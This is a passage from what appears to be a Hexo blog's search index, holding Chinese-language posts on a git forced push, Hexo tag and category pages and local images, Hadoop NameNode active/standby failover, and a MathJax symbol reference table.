class="keyword">for</span> <span class="string">''</span>:</span><br><span class="line">To https://github.com/C.git</span><br><span class="line"> ! [rejected]        master -&gt; master (non-fast-forward)</span><br><span class="line">error: failed to push some refs to <span class="string">'https://github.com/C.git'</span></span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: <span class="string">'git pull ...'</span>) before pushing again.</span><br><span class="line">hint: See the <span class="string">'Note about fast-forwards'</span> <span class="keyword">in</span> <span class="string">'git push --help'</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">D:\workspace\CLion\C&gt;git push -u origin master -f</span><br><span class="line">fatal: HttpRequestException encountered.</span><br><span class="line">   发送请求时出错。</span><br><span class="line">Username <span class="keyword">for</span> <span class="string">'https://github.com'</span>: </span><br><span class="line">Password <span class="keyword">for</span> <span class="string">''</span>:</span><br><span class="line">Counting objects: 13, <span class="keyword">done</span>.</span><br><span class="line">Delta compression using up to 8 threads.</span><br><span class="line">Compressing objects: 100% (10/10), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (13/13), 1.48 KiB | 505.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 13 (delta 0), reused 0 (delta 0)</span><br><span class="line">To https://github.com/C.git</span><br><span class="line"> + 0b30ec0...5ca759a master -&gt; master (forced update)</span><br><span class="line">Branch <span class="string">'master'</span> <span class="built_in">set</span> up to track remote branch <span class="string">'master'</span> from <span class="string">'origin'</span>.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo创建tags和categories</title>
    <url>/2018/07/19/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/hexo%E5%88%9B%E5%BB%BAtags%E5%92%8Ccategories/</url>
    <content><![CDATA[<p>默认用 hexo next主题创建文章后,无标签和分类信息。点击菜单Cannot GET /tags/ 。</p>
<blockquote>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1></blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入工程目录</span></span><br><span class="line"><span class="built_in">cd</span> your_hexo_project</span><br><span class="line"><span class="comment">#创建页面,source/_post下会创建tags目录</span></span><br><span class="line">hexo new page <span class="string">"tags"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑页面</span></span><br><span class="line">vim tags/index.md</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改成如下内容后保存</span></span><br><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2018-07-19 13:30</span><br><span class="line"><span class="built_in">type</span>: <span class="string">"tags"</span></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在theme/next/_config.yml添加tags到menu下</span></span><br><span class="line">menu:</span><br><span class="line">home: /</span><br><span class="line">archives: /archives/</span><br><span class="line">categories: /categories/</span><br><span class="line">tags: /tags/</span><br></pre></td></tr></table></figure>
<p>配置完成后,重新部署(hexo clean /hexo generate)后即可。</p>
<p>categories创建方法同上。</p>
<blockquote>
<h4 id="如有错误-欢迎批评指正-望不吝赐教"><a href="#如有错误-欢迎批评指正-望不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,望不吝赐教!!!"></a>如有错误,欢迎批评指正,望不吝赐教!!!</h4></blockquote>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop namenode active 和standby切换</title>
    <url>/2018/09/25/%E5%A4%A7%E6%95%B0%E6%8D%AE/hadoop%20namenode%20active%20%E5%92%8Cstandby%E5%88%87%E6%8D%A2/</url>
    <content><![CDATA[<p>hadoop namenode 需要的手动激活对应的 namenode,有以下两种方式:</p>
<blockquote>
<ul>
<li>hdfs haadmin -transitionToActive</li>
<li>制造故障，自动容错</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="transitionToActive"><a href="#transitionToActive" class="headerlink" title="transitionToActive"></a>transitionToActive</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop02 hadoop]<span class="comment"># hdfs haadmin -transitionToActive --forcemanual nn1</span></span><br><span class="line">You have specified the --forcemanual flag. This flag is dangerous, as it can induce a split-brain scenario that WILL CORRUPT your HDFS namespace, possibly irrecoverably.</span><br><span class="line"></span><br><span class="line">It is recommended not to use this flag, but instead to shut down the cluster and <span class="built_in">disable</span> automatic failover <span class="keyword">if</span> you prefer to manually manage your HA state.</span><br><span class="line"></span><br><span class="line">You may abort safely by answering <span class="string">'n'</span> or hitting ^C now.</span><br><span class="line"></span><br><span class="line">Are you sure you want to <span class="built_in">continue</span>? (Y or N) y</span><br><span class="line">2019-03-28 19:24:01,673 WARN ha.HAAdmin: Proceeding with manual HA state management even though</span><br><span class="line">automatic failover is enabled <span class="keyword">for</span> NameNode at hadoop02/192.168.19.131:9000</span><br><span class="line">transitionToActive: Node nn2 is already active</span><br><span class="line">Usage: haadmin [-ns &lt;nameserviceId&gt;]-transitionToActive [--forceactive] &lt;serviceId&gt;]</span><br></pre></td></tr></table></figure>
<p>—forcemanual 这个标记不推荐使用,可能引起脑裂问题.<br>这种方式我试了,但是不行,没有自动切换.</p>
<h1 id="制造故障"><a href="#制造故障" class="headerlink" title="制造故障"></a>制造故障</h1><p>在 nn1 节点关闭 zkfc 停止 DFSZKFailoverController 服务。则 nn2 会自动成为 active。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop01 logs]<span class="comment"># /opt/bigdata/hadoop-3.2.0/sbin/hadoop-daemon.sh stop zkfc</span></span><br><span class="line">WARNING: Use of this script to stop HDFS daemons is deprecated.</span><br><span class="line">WARNING: Attempting to execute replacement <span class="string">"hdfs --daemon stop"</span> instead.</span><br><span class="line">[root@hadoop01 logs]<span class="comment"># jps</span></span><br><span class="line">53552 Jps</span><br><span class="line">24533 QuorumPeerMain</span><br><span class="line">50437 NameNode</span><br><span class="line">51271 ResourceManager</span><br><span class="line">[root@hadoop01 logs]<span class="comment"># /opt/bigdata/hadoop-3.2.0/sbin/hadoop-daemon.sh start zkfc</span></span><br><span class="line">WARNING: Use of this script to start HDFS daemons is deprecated.</span><br><span class="line">WARNING: Attempting to execute replacement <span class="string">"hdfs --daemon start"</span> instead.</span><br><span class="line">[root@hadoop01 logs]<span class="comment"># jps</span></span><br><span class="line">24533 QuorumPeerMain</span><br><span class="line">50437 NameNode</span><br><span class="line">53685 DFSZKFailoverController</span><br><span class="line">51271 ResourceManager</span><br><span class="line">55453 Jps</span><br></pre></td></tr></table></figure>
<p>执行完成后查看 namenode 的状态:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop01 logs]<span class="comment"># hdfs haadmin -getAllServiceState</span></span><br><span class="line">hadoop01:9000                                      standby</span><br><span class="line">hadoop02:9000                                      active</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo插入本地图片</title>
    <url>/2018/08/10/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/hexo%E6%8F%92%E5%85%A5%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<p>加载网络图片就不多说了,主要说一下hexo怎么加载本地的图片。</p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>修改根_config.yml文件：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span><span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>在source/_post中,创建和文章标题一样的同级目录,引入图片即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">![](hexo_dog_1.jpg)</span><br></pre></td></tr></table></figure>
<p><img src="/2018/08/10/开发工具/hexo插入本地图片/hexo_dog_1.jpg" alt></p>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h2 id="The-request-content-cannot-loaded"><a href="#The-request-content-cannot-loaded" class="headerlink" title="The request content cannot loaded"></a>The request content cannot loaded</h2><p><img src="/2018/08/10/开发工具/hexo插入本地图片/hexo_20180810072301.png" alt></p>
<p>这种情况是图片路径没找到,检查目录是否和标题一样,是否是同级目录,图片名称是否正确。</p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>mathjax常用数学符号</title>
    <url>/2018/07/08/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/mathjax%E5%B8%B8%E7%94%A8%E6%95%B0%E5%AD%A6%E7%AC%A6%E5%8F%B7/</url>
    <content><![CDATA[<p>mathjax 提供了很多数学工具,本篇主要介绍一些常用的数学符号及其写法.</p>
<blockquote>
<h1 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h1><h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
<th style="text-align:center">国际音标</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\alpha</td>
<td style="text-align:center"><script type="math/tex">\alpha</script></td>
<td style="text-align:center">/‘ælfə/</td>
</tr>
<tr>
<td style="text-align:left">\beta</td>
<td style="text-align:center"><script type="math/tex">\beta</script></td>
<td style="text-align:center">/‘bi:tə/或 /‘beɪtə/</td>
</tr>
<tr>
<td style="text-align:left">\gamma</td>
<td style="text-align:center"><script type="math/tex">\gamma</script></td>
<td style="text-align:center">/‘gæmə/</td>
</tr>
<tr>
<td style="text-align:left">\Gamma</td>
<td style="text-align:center"><script type="math/tex">\Gamma</script></td>
<td style="text-align:center">/‘gæmə/</td>
</tr>
<tr>
<td style="text-align:left">\digamma</td>
<td style="text-align:center"><script type="math/tex">\digamma</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\delta</td>
<td style="text-align:center"><script type="math/tex">\delta</script></td>
<td style="text-align:center">/‘deltə/</td>
</tr>
<tr>
<td style="text-align:left">\Delta</td>
<td style="text-align:center"><script type="math/tex">\Delta</script></td>
<td style="text-align:center">/‘deltə/</td>
</tr>
<tr>
<td style="text-align:left">\epsilon</td>
<td style="text-align:center"><script type="math/tex">\epsilon</script></td>
<td style="text-align:center">/‘epsɪlɒn/</td>
</tr>
<tr>
<td style="text-align:left">\varepsilon</td>
<td style="text-align:center"><script type="math/tex">\varepsilon</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\zeta</td>
<td style="text-align:center"><script type="math/tex">\zeta</script></td>
<td style="text-align:center">/‘zi:tə/</td>
</tr>
<tr>
<td style="text-align:left">\eta</td>
<td style="text-align:center"><script type="math/tex">\eta</script></td>
<td style="text-align:center">/‘i:tə/</td>
</tr>
<tr>
<td style="text-align:left">\theta</td>
<td style="text-align:center"><script type="math/tex">\theta</script></td>
<td style="text-align:center">/‘θi:tə/</td>
</tr>
<tr>
<td style="text-align:left">\Theta</td>
<td style="text-align:center"><script type="math/tex">\Theta</script></td>
<td style="text-align:center">/‘θi:tə/</td>
</tr>
<tr>
<td style="text-align:left">\vartheta</td>
<td style="text-align:center"><script type="math/tex">\vartheta</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\iota</td>
<td style="text-align:center"><script type="math/tex">\iota</script></td>
<td style="text-align:center">/aɪ’əʊtə/</td>
</tr>
<tr>
<td style="text-align:left">\kappa</td>
<td style="text-align:center"><script type="math/tex">\kappa</script></td>
<td style="text-align:center">/‘kæpə/</td>
</tr>
<tr>
<td style="text-align:left">\varkappa</td>
<td style="text-align:center"><script type="math/tex">\varkappa</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\lambda</td>
<td style="text-align:center"><script type="math/tex">\lambda</script></td>
<td style="text-align:center">/‘læmdə/</td>
</tr>
<tr>
<td style="text-align:left">\Lambda</td>
<td style="text-align:center"><script type="math/tex">\Lambda</script></td>
<td style="text-align:center">/‘læmdə/</td>
</tr>
<tr>
<td style="text-align:left">\mu</td>
<td style="text-align:center"><script type="math/tex">\mu</script></td>
<td style="text-align:center">/mju:/</td>
</tr>
<tr>
<td style="text-align:left">\nu</td>
<td style="text-align:center"><script type="math/tex">\nu</script></td>
<td style="text-align:center">/nju:/</td>
</tr>
<tr>
<td style="text-align:left">\xi</td>
<td style="text-align:center"><script type="math/tex">\xi</script></td>
<td style="text-align:center">希腊 /ksi/ 英美 /ˈzaɪ/ 或 /ˈksaɪ/</td>
</tr>
<tr>
<td style="text-align:left">\Xi</td>
<td style="text-align:center"><script type="math/tex">\Xi</script></td>
<td style="text-align:center">希腊 /ksi/ 英美 /ˈzaɪ/ 或 /ˈksaɪ/</td>
</tr>
<tr>
<td style="text-align:left">\omicron</td>
<td style="text-align:center"><script type="math/tex">\omicron</script></td>
<td style="text-align:center">/əuˈmaikrən/ 或 /ˈɑmɪˌkrɑn/</td>
</tr>
<tr>
<td style="text-align:left">\pi</td>
<td style="text-align:center"><script type="math/tex">\pi</script></td>
<td style="text-align:center">/paɪ/</td>
</tr>
<tr>
<td style="text-align:left">\Pi</td>
<td style="text-align:center"><script type="math/tex">\Pi</script></td>
<td style="text-align:center">/paɪ/</td>
</tr>
<tr>
<td style="text-align:left">\varpi</td>
<td style="text-align:center"><script type="math/tex">\varpi</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\rho</td>
<td style="text-align:center"><script type="math/tex">\rho</script></td>
<td style="text-align:center">/rəʊ/</td>
</tr>
<tr>
<td style="text-align:left">\varrho</td>
<td style="text-align:center"><script type="math/tex">\varrho</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\sigma</td>
<td style="text-align:center"><script type="math/tex">\sigma</script></td>
<td style="text-align:center">/‘sɪɡmə/</td>
</tr>
<tr>
<td style="text-align:left">\Sigma</td>
<td style="text-align:center"><script type="math/tex">\Sigma</script></td>
<td style="text-align:center">/‘sɪɡmə/</td>
</tr>
<tr>
<td style="text-align:left">\varsigma</td>
<td style="text-align:center"><script type="math/tex">\varsigma</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\tau</td>
<td style="text-align:center"><script type="math/tex">\tau</script></td>
<td style="text-align:center">/tɔ:/ 或 /taʊ/</td>
</tr>
<tr>
<td style="text-align:left">\upsilon</td>
<td style="text-align:center"><script type="math/tex">\upsilon</script></td>
<td style="text-align:center">/ˈipsilon/ 或 /ˈʌpsɨlɒn/</td>
</tr>
<tr>
<td style="text-align:left">\Upsilon</td>
<td style="text-align:center"><script type="math/tex">\Upsilon</script></td>
<td style="text-align:center">/ˈipsilon/ 或 /ˈʌpsɨlɒn/</td>
</tr>
<tr>
<td style="text-align:left">\phi</td>
<td style="text-align:center"><script type="math/tex">\phi</script></td>
<td style="text-align:center">/faɪ/</td>
</tr>
<tr>
<td style="text-align:left">\Phi</td>
<td style="text-align:center"><script type="math/tex">\Phi</script></td>
<td style="text-align:center">/faɪ/</td>
</tr>
<tr>
<td style="text-align:left">\varphi</td>
<td style="text-align:center"><script type="math/tex">\varphi</script></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:left">\chi</td>
<td style="text-align:center"><script type="math/tex">\chi</script></td>
<td style="text-align:center">/kaɪ/</td>
</tr>
<tr>
<td style="text-align:left">\psi</td>
<td style="text-align:center"><script type="math/tex">\psi</script></td>
<td style="text-align:center">/psaɪ/</td>
</tr>
<tr>
<td style="text-align:left">\Psi</td>
<td style="text-align:center"><script type="math/tex">\Psi</script></td>
<td style="text-align:center">/psaɪ/</td>
</tr>
<tr>
<td style="text-align:left">\omega</td>
<td style="text-align:center"><script type="math/tex">\omega</script></td>
<td style="text-align:center">/‘əʊmɪɡə/或 /oʊ’meɡə/</td>
</tr>
<tr>
<td style="text-align:left">\Omega</td>
<td style="text-align:center"><script type="math/tex">\Omega</script></td>
<td style="text-align:center">/‘əʊmɪɡə/或 /oʊ’meɡə/</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\mid</td>
<td style="text-align:center"><script type="math/tex">\mid</script></td>
</tr>
<tr>
<td style="text-align:left">\nmid</td>
<td style="text-align:center"><script type="math/tex">\nmid</script></td>
</tr>
<tr>
<td style="text-align:left">\cdot</td>
<td style="text-align:center"><script type="math/tex">\cdot</script></td>
</tr>
<tr>
<td style="text-align:left">\leq</td>
<td style="text-align:center"><script type="math/tex">\leq</script></td>
</tr>
<tr>
<td style="text-align:left">\geq</td>
<td style="text-align:center"><script type="math/tex">\geq</script></td>
</tr>
<tr>
<td style="text-align:left">\neq</td>
<td style="text-align:center"><script type="math/tex">\neq</script></td>
</tr>
<tr>
<td style="text-align:left">\approx</td>
<td style="text-align:center"><script type="math/tex">\approx</script></td>
</tr>
<tr>
<td style="text-align:left">\equiv</td>
<td style="text-align:center"><script type="math/tex">\equiv</script></td>
</tr>
<tr>
<td style="text-align:left">\circ</td>
<td style="text-align:center"><script type="math/tex">\circ</script></td>
</tr>
<tr>
<td style="text-align:left">\ast</td>
<td style="text-align:center"><script type="math/tex">\ast</script></td>
</tr>
<tr>
<td style="text-align:left">\bigodot</td>
<td style="text-align:center"><script type="math/tex">\bigodot</script></td>
</tr>
<tr>
<td style="text-align:left">\bigotimes</td>
<td style="text-align:center"><script type="math/tex">\bigotimes</script></td>
</tr>
<tr>
<td style="text-align:left">\pm</td>
<td style="text-align:center"><script type="math/tex">\pm</script></td>
</tr>
<tr>
<td style="text-align:left">\times</td>
<td style="text-align:center"><script type="math/tex">\times</script></td>
</tr>
<tr>
<td style="text-align:left">\div</td>
<td style="text-align:center"><script type="math/tex">\div</script></td>
</tr>
<tr>
<td style="text-align:left">\sum</td>
<td style="text-align:center"><script type="math/tex">\sum</script></td>
</tr>
<tr>
<td style="text-align:left">\prod</td>
<td style="text-align:center"><script type="math/tex">\prod</script></td>
</tr>
<tr>
<td style="text-align:left">\coprod</td>
<td style="text-align:center"><script type="math/tex">\coprod</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="集合运算符"><a href="#集合运算符" class="headerlink" title="集合运算符"></a>集合运算符</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\emptyset</td>
<td style="text-align:center"><script type="math/tex">\emptyset</script></td>
</tr>
<tr>
<td style="text-align:left">\in</td>
<td style="text-align:center"><script type="math/tex">\in</script></td>
</tr>
<tr>
<td style="text-align:left">\notin</td>
<td style="text-align:center"><script type="math/tex">\notin</script></td>
</tr>
<tr>
<td style="text-align:left">\subset</td>
<td style="text-align:center"><script type="math/tex">\subset</script></td>
</tr>
<tr>
<td style="text-align:left">\supset</td>
<td style="text-align:center"><script type="math/tex">\supset</script></td>
</tr>
<tr>
<td style="text-align:left">\subseteq</td>
<td style="text-align:center"><script type="math/tex">\subseteq</script></td>
</tr>
<tr>
<td style="text-align:left">\supseteq</td>
<td style="text-align:center"><script type="math/tex">\supseteq</script></td>
</tr>
<tr>
<td style="text-align:left">\bigcap</td>
<td style="text-align:center"><script type="math/tex">\bigcap</script></td>
</tr>
<tr>
<td style="text-align:left">\bigcup</td>
<td style="text-align:center"><script type="math/tex">\bigcup</script></td>
</tr>
<tr>
<td style="text-align:left">\bigvee</td>
<td style="text-align:center"><script type="math/tex">\bigvee</script></td>
</tr>
<tr>
<td style="text-align:left">\bigwedge</td>
<td style="text-align:center"><script type="math/tex">\bigwedge</script></td>
</tr>
<tr>
<td style="text-align:left">\biguplus</td>
<td style="text-align:center"><script type="math/tex">\biguplus</script></td>
</tr>
<tr>
<td style="text-align:left">\bigsqcup</td>
<td style="text-align:center"><script type="math/tex">\bigsqcup</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\bot</td>
<td style="text-align:center"><script type="math/tex">\bot</script></td>
</tr>
<tr>
<td style="text-align:left">\angle</td>
<td style="text-align:center"><script type="math/tex">\angle</script></td>
</tr>
<tr>
<td style="text-align:left">\30^\circ</td>
<td style="text-align:center"><script type="math/tex">30^\circ</script></td>
</tr>
<tr>
<td style="text-align:left">\sin</td>
<td style="text-align:center"><script type="math/tex">\sin</script></td>
</tr>
<tr>
<td style="text-align:left">\cos</td>
<td style="text-align:center"><script type="math/tex">\cos</script></td>
</tr>
<tr>
<td style="text-align:left">\tan</td>
<td style="text-align:center"><script type="math/tex">\tan</script></td>
</tr>
<tr>
<td style="text-align:left">\cot</td>
<td style="text-align:center"><script type="math/tex">\cot</script></td>
</tr>
<tr>
<td style="text-align:left">\sec</td>
<td style="text-align:center"><script type="math/tex">\sec</script></td>
</tr>
<tr>
<td style="text-align:left">\csc</td>
<td style="text-align:center"><script type="math/tex">\csc</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="对数运算"><a href="#对数运算" class="headerlink" title="对数运算"></a>对数运算</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\log</td>
<td style="text-align:center"><script type="math/tex">\log</script></td>
</tr>
<tr>
<td style="text-align:left">\lg</td>
<td style="text-align:center"><script type="math/tex">\lg</script></td>
</tr>
<tr>
<td style="text-align:left">\ln</td>
<td style="text-align:center"><script type="math/tex">\ln</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="微积分运算"><a href="#微积分运算" class="headerlink" title="微积分运算"></a>微积分运算</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\prime</td>
<td style="text-align:center"><script type="math/tex">\prime</script></td>
</tr>
<tr>
<td style="text-align:left">\int</td>
<td style="text-align:center"><script type="math/tex">\int</script></td>
</tr>
<tr>
<td style="text-align:left">\iint</td>
<td style="text-align:center"><script type="math/tex">\iint</script></td>
</tr>
<tr>
<td style="text-align:left">\iiint</td>
<td style="text-align:center"><script type="math/tex">\iiint</script></td>
</tr>
<tr>
<td style="text-align:left">\iiiint</td>
<td style="text-align:center"><script type="math/tex">\iiiint</script></td>
</tr>
<tr>
<td style="text-align:left">\oint</td>
<td style="text-align:center"><script type="math/tex">\oint</script></td>
</tr>
<tr>
<td style="text-align:left">\lim</td>
<td style="text-align:center"><script type="math/tex">\lim</script></td>
</tr>
<tr>
<td style="text-align:left">\infty</td>
<td style="text-align:center"><script type="math/tex">\infty</script></td>
</tr>
<tr>
<td style="text-align:left">\nabla</td>
<td style="text-align:center"><script type="math/tex">\nabla</script></td>
</tr>
<tr>
<td style="text-align:left">\partial x</td>
<td style="text-align:center"><script type="math/tex">\partial x</script></td>
</tr>
<tr>
<td style="text-align:left">\mathrm{d}x</td>
<td style="text-align:center"><script type="math/tex">\mathrm{d}x</script></td>
</tr>
<tr>
<td style="text-align:left">\dot x</td>
<td style="text-align:center"><script type="math/tex">\dot x</script></td>
</tr>
<tr>
<td style="text-align:left">\ddot y</td>
<td style="text-align:center"><script type="math/tex">\ddot y</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\because</td>
<td style="text-align:center"><script type="math/tex">\because</script></td>
</tr>
<tr>
<td style="text-align:left">\therefore</td>
<td style="text-align:center"><script type="math/tex">\therefore</script></td>
</tr>
<tr>
<td style="text-align:left">\forall</td>
<td style="text-align:center"><script type="math/tex">\forall</script></td>
</tr>
<tr>
<td style="text-align:left">\exists</td>
<td style="text-align:center"><script type="math/tex">\exists</script></td>
</tr>
<tr>
<td style="text-align:left">\not=</td>
<td style="text-align:center"><script type="math/tex">\not=</script></td>
</tr>
<tr>
<td style="text-align:left">\not&gt;</td>
<td style="text-align:center"><script type="math/tex">\not></script></td>
</tr>
<tr>
<td style="text-align:left">\not\subset</td>
<td style="text-align:center"><script type="math/tex">\not\subset</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="几何符号"><a href="#几何符号" class="headerlink" title="几何符号"></a>几何符号</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\Diamond</td>
<td style="text-align:center"><script type="math/tex">\Diamond</script></td>
</tr>
<tr>
<td style="text-align:left">\Box</td>
<td style="text-align:center"><script type="math/tex">\Box</script></td>
</tr>
<tr>
<td style="text-align:left">\Delta</td>
<td style="text-align:center"><script type="math/tex">\Delta</script></td>
</tr>
<tr>
<td style="text-align:left">\triangle</td>
<td style="text-align:center"><script type="math/tex">\triangle</script></td>
</tr>
<tr>
<td style="text-align:left">\angle\alpha\beta\Gamma</td>
<td style="text-align:center"><script type="math/tex">\angle\alpha\beta\Gamma</script></td>
</tr>
<tr>
<td style="text-align:left">\sin!\frac{\pi}{3}=\sin60^\circ=\frac{\sqrt{3}}{2}</td>
<td style="text-align:center"><script type="math/tex">\sin\!\frac{\pi}{3}=\sin60^\circ=\frac{\sqrt{3}}{2}</script></td>
</tr>
<tr>
<td style="text-align:left">\perp</td>
<td style="text-align:center"><script type="math/tex">\perp</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h2 id="箭头符号"><a href="#箭头符号" class="headerlink" title="箭头符号"></a>箭头符号</h2></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">mathjax 表达式</th>
<th style="text-align:center">显示效果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\uparrow</td>
<td style="text-align:center"><script type="math/tex">\uparrow</script></td>
</tr>
<tr>
<td style="text-align:left">\downarrow</td>
<td style="text-align:center"><script type="math/tex">\downarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Uparrow</td>
<td style="text-align:center"><script type="math/tex">\Uparrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Downarrow</td>
<td style="text-align:center"><script type="math/tex">\Downarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\updownarrow</td>
<td style="text-align:center"><script type="math/tex">\updownarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Updownarrow</td>
<td style="text-align:center"><script type="math/tex">\Updownarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\rightarrow</td>
<td style="text-align:center"><script type="math/tex">\rightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\leftarrow</td>
<td style="text-align:center"><script type="math/tex">\leftarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Rightarrow</td>
<td style="text-align:center"><script type="math/tex">\Rightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Leftarrow</td>
<td style="text-align:center"><script type="math/tex">\Leftarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\leftrightarrow</td>
<td style="text-align:center"><script type="math/tex">\leftrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Leftrightarrow</td>
<td style="text-align:center"><script type="math/tex">\Leftrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\longrightarrow</td>
<td style="text-align:center"><script type="math/tex">\longrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\longleftarrow</td>
<td style="text-align:center"><script type="math/tex">\longleftarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Longrightarrow</td>
<td style="text-align:center"><script type="math/tex">\Longrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Longleftarrow</td>
<td style="text-align:center"><script type="math/tex">\Longleftarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\longleftrightarrow</td>
<td style="text-align:center"><script type="math/tex">\longleftrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\Longleftrightarrow</td>
<td style="text-align:center"><script type="math/tex">\Longleftrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\mapsto</td>
<td style="text-align:center"><script type="math/tex">\mapsto</script></td>
</tr>
<tr>
<td style="text-align:left">\longmapsto</td>
<td style="text-align:center"><script type="math/tex">\longmapsto</script></td>
</tr>
<tr>
<td style="text-align:left">\hookleftarrow</td>
<td style="text-align:center"><script type="math/tex">\hookleftarrow</script></td>
</tr>
